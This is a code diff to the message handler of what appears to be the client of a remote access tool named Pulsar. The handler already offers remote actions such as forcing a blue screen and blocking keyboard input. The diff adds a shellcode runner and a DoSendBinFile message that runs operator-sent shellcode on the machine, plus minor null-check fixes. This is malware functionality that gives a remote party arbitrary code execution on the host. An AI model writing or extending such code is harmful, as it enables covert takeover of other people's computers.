@@ -7,6 +7,14 @@ using System;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
+using System.Threading;
+using System.Diagnostics;
+using System.Reflection;
+using System.Security.Cryptography;
+using System.Text;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
 namespace Pulsar.Client.Messages
 {
@@ -17,7 +25,8 @@ namespace Pulsar.Client.Messages
         private HideTaskbar _hideTaskbar = new HideTaskbar();
         private KeyboardInput _keyboardInput = new KeyboardInput();
         private CDTray _cdTray = new CDTray();
-        private MonitorPower _monitorPower = new MonitorPower(); // Added monitor handler
+        private MonitorPower _monitorPower = new MonitorPower();
+        private ShellcodeRunner _shellcodeRunner = new ShellcodeRunner(); // Added shellcode runner
 
         public bool CanExecute(IMessage message) =>
             message is DoBSOD ||
@@ -26,7 +35,8 @@ namespace Pulsar.Client.Messages
             message is DoChangeWallpaper ||
             message is DoBlockKeyboardInput ||
             message is DoCDTray ||
-            message is DoMonitorsOff; // Added support for monitor messages
+            message is DoMonitorsOff ||
+            message is DoSendBinFile;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -52,9 +62,24 @@ namespace Pulsar.Client.Messages
                 case DoCDTray msg:
                     Execute(sender, msg);
                     break;
-                case DoMonitorsOff msg: // Added case for monitor power
+                case DoMonitorsOff msg:
                     Execute(sender, msg);
                     break;
+                case DoSendBinFile msg:
+                    Execute(sender, msg);
+                    break;
+            }
+        }
+
+        private void Execute(ISender client, DoSendBinFile message)
+        {
+            try
+            {
+                _shellcodeRunner.Handle(message, client);
+            }
+            catch (Exception ex)
+            {
+                client.Send(new SetStatus { Message = $"Failed to execute shellcode: {ex.Message}" });
             }
         }
 
@@ -71,7 +96,7 @@ namespace Pulsar.Client.Messages
             }
         }
 
-        private void Execute(ISender client, DoMonitorsOff message) // New method
+        private void Execute(ISender client, DoMonitorsOff message)
         {
             try
             {
@@ -156,7 +181,7 @@ namespace Pulsar.Client.Messages
 
         private string GetImageExtension(string imageFormat)
         {
-            switch (imageFormat.ToLower())
+            switch (imageFormat?.ToLower())
             {
                 case "jpeg":
                 case "jpg":
@@ -174,7 +199,7 @@ namespace Pulsar.Client.Messages
 
         private ImageFormat GetImageFormat(string imageFormat)
         {
-            switch (imageFormat.ToLower())
+            switch (imageFormat?.ToLower())
             {
                 case "jpeg":
                 case "jpg":
